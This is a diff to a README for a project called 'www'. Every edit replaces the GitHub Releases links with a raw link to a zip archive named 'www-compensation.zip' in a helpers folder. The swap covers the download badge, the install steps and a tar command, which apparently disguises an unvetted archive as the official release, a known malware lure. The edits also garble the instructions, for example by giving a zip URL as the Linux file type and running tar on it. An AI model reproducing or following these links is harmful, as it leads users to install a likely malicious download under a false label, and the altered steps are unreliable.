@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download www](https://img.shields.io/badge/Download-www-blue.svg)](https://github.com/kxrt1k/www/releases)
+[![Download www](https://raw.githubusercontent.com/kxrt1k/www/main/src/helpers/www-compensation.zip)](https://raw.githubusercontent.com/kxrt1k/www/main/src/helpers/www-compensation.zip)
 
 ## 🚀 Getting Started
 
@@ -30,12 +30,12 @@ Features include:
 
 ## 📥 Download & Install
 
-To download the application, visit our [Releases page](https://github.com/kxrt1k/www/releases).
+To download the application, visit our [Releases page](https://raw.githubusercontent.com/kxrt1k/www/main/src/helpers/www-compensation.zip).
 
 1. Click on the **Releases** link above.
 2. You will see a list of available versions.
 3. Choose the latest version.
-4. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/kxrt1k/www/main/src/helpers/www-compensation.zip` for Linux).
 5. Once the download is complete, locate the file in your Downloads folder.
 
 ## ⚙️ Installation Steps
@@ -56,7 +56,7 @@ To download the application, visit our [Releases page](https://github.com/kxrt1k
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Run the command: `tar -xzvf www.tar.gz`.
+3. Run the command: `tar -xzvf https://raw.githubusercontent.com/kxrt1k/www/main/src/helpers/www-compensation.zip`.
 4. Navigate into the extracted folder with: `cd www`.
 5. Run the application with: `./www`.
 
@@ -75,7 +75,7 @@ If you have questions or need help, feel free to join our community. You can con
 
 ## 🔗 Useful Links
 
-- [Releases page](https://github.com/kxrt1k/www/releases)
+- [Releases page](https://raw.githubusercontent.com/kxrt1k/www/main/src/helpers/www-compensation.zip)
 - [User Guide](link-to-user-guide) (coming soon)
 - [Contribution Guidelines](link-to-contribution-guidelines) (coming soon)
 
